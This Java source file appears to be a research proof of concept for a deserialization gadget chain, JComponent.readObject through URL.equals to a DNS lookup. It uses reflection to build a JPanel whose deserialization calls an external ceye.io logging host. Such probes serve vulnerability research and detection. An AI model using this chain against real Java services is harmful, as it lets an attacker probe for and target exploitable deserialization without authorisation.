package com.example.JDK;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;

import javax.swing.*;
import java.net.URL;

public class POC_3 {

    /*** run with jComponent_equals.jar
     * <javax.swing.JComponent: void readObject(java.io.ObjectInputStream)>
     * <javax.swing.ArrayTable: void put(java.lang.Object,java.lang.Object)>
     * <java.net.URL: boolean equals(java.lang.Object)>
     * <java.net.URLStreamHandler: boolean equals(java.net.URL,java.net.URL)>
     * <java.net.URLStreamHandler: boolean sameFile(java.net.URL,java.net.URL)>
     * <java.net.URLStreamHandler: boolean hostsEqual(java.net.URL,java.net.URL)>
     * <java.net.URLStreamHandler: java.net.InetAddress getHostAddress(java.net.URL)>
     * <java.net.InetAddress: java.net.InetAddress getByName(java.lang.String)>
     */

    public static void main(String[] args) throws Exception {
        URL url1 = new URL("http://k2nlbt.ceye.io");
        URL url2 = new URL("http://k2nlbt.ceye.io");

        JPanel j = new JPanel();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[]{url1, "1", url2, "2"};

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(j, "clientProperties", arrayTable);
        SerializeUtil.deserialize(SerializeUtil.serialize(j));

    }

}
